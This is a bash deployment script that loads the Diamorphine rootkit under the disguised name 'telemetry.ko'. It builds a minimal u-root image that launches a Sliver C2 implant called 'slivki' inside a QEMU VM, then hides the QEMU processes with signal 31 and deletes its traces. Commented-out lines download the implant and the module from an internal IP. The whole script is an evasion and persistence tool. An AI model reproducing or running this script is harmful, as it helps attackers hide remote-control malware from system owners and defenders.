#!/bin/bash
#
# VM Setup and Diamorphine driver Deployment Script
# This script installs dependencies, sets up u-root, builds a minimal Linux environment,
# and runs Sliver C2 agent in a QEMU virtual machine with network configuration.

set -e

echo "Loading telemetry kernel module..."
mv telemetry.ko /tmp/telemetry.ko
insmod /tmp/telemetry.ko && rm /tmp/telemetry.ko

echo "Starting system setup and configuration..."

echo "Updating system and installing dependencies..."
apt update -y
apt-get install -y qemu-system-x86 qemu-utils bridge-utils llvm clang gcc-multilib \
                   build-essential linux-headers-$(uname -r) git ca-certificates \
                   wget tar procps gawk

echo "Installing Go 1.24.2..."
wget https://go.dev/dl/go1.24.2.linux-amd64.tar.gz -O /tmp/go1.24.2.linux-amd64.tar.gz
tar -C /usr/local -xzf /tmp/go1.24.2.linux-amd64.tar.gz

echo "Configuring Go environment..."
cat << EOF >> ~/.bashrc
export GOROOT=/usr/local/go
export GOPATH=\$HOME/go
export PATH=\$GOROOT/bin:\$GOPATH/bin:\$PATH
EOF
source ~/.bashrc

export GOROOT=/usr/local/go
export GOPATH=$HOME/go
export PATH=$GOROOT/bin:$GOPATH/bin:$PATH

echo "Installing u-root..."
$GOROOT/bin/go install github.com/u-root/u-root@latest
git clone https://github.com/u-root/u-root.git /tmp/u-root


# ---
#wget http://192.168.1.109/slivki -O /tmp/slivki
#chmod +x /tmp/slivki
#wget http://192.168.1.109/telemetry.ko -O /tmp/telemetry.ko
# ---

mv slivki /tmp/slivki && chmod +x /tmp/slivki

echo "Building minimal Linux environment with u-root..."
#(
#  cd /tmp/u-root && \
#  u-root -uinitcmd="/bin/sh -c 'insmod /bin/e1000/e1000.ko && ip link set dev eth0 up && ip addr add 192.168.10.50/24 dev eth0 && ip route add default via 192.168.10.1 dev eth0 && bin/slivki'" \
#  -files /lib/modules/$(uname -r)/kernel/drivers/net/ethernet/intel/e1000:/bin/e1000 \
#  -files ../slivki:/bin/slivki \
#  ./cmds/core/{init,ip,insmod,gosh}
#)

(
  cd /tmp/u-root && \
  u-root -uinitcmd="/bin/sh -c 'echo \"Starting network setup...\" && \
    insmod /bin/e1000/e1000.ko && \
    sleep 1 && \
    echo \"Setting link up...\" && \
    ip link set dev eth0 up && \
    sleep 1 && \
    echo \"Adding IP address...\" && \
    ip addr add 192.168.10.50/24 dev eth0 && \
    sleep 1 && \
    echo \"Adding route...\" && \
    ip route add default via 192.168.10.1 dev eth0 || echo \"Route failed but continuing...\" && \
    echo \"Network is now configured and working:\" && \
    ip addr show eth0 && \
    echo \"Listing slivki:\" && \
    ls -la /bin/slivki && \
    echo \"Trying to run slivki directly:\" && \
    /bin/slivki'" \
  -files /lib/modules/$(uname -r)/kernel/drivers/net/ethernet/intel/e1000:/bin/e1000 \
  -files ../slivki:/bin/slivki \
  ./cmds/core/{init,ip,insmod,gosh,ls,sleep}
)

rm -rf /tmp/slivki

echo "Enabling IP forwarding..."
echo "net.ipv4.ip_forward=1" | tee -a /etc/sysctl.conf
sysctl -p

echo "Starting QEMU virtual machine with custom network configuration..."
sudo qemu-system-x86_64 \
  -kernel /boot/vmlinuz-$(uname -r) \
  -initrd /tmp/initramfs.linux_amd64.cpio \
  -append "console=ttyS0 random.trust_cpu=on" \
  -nographic \
  -device e1000,netdev=net0,mac=42:41:de:ad:be:ef \
  -netdev user,id=net0,net=192.168.10.0/24,host=192.168.10.1,dhcpstart=192.168.10.50 &

echo "Waiting for QEMU processes to initialize..."
sleep 15

echo "Terminating QEMU processes..."
ps aux | grep -i qemu-system-x86_64 | awk '{print $2}' > /tmp/qemu_pids
for pid in $(cat /tmp/qemu_pids); do
  kill -31 $pid 2>/dev/null || echo "Process $pid already terminated"
done

echo "Cleaning up temporary files..."
rm -rf /tmp/go1.24.2.linux-amd64.tar.gz /tmp/qemu_pids /tmp/u-root /tmp/initramfs.linux_amd64.cpio

echo "Setup complete!"
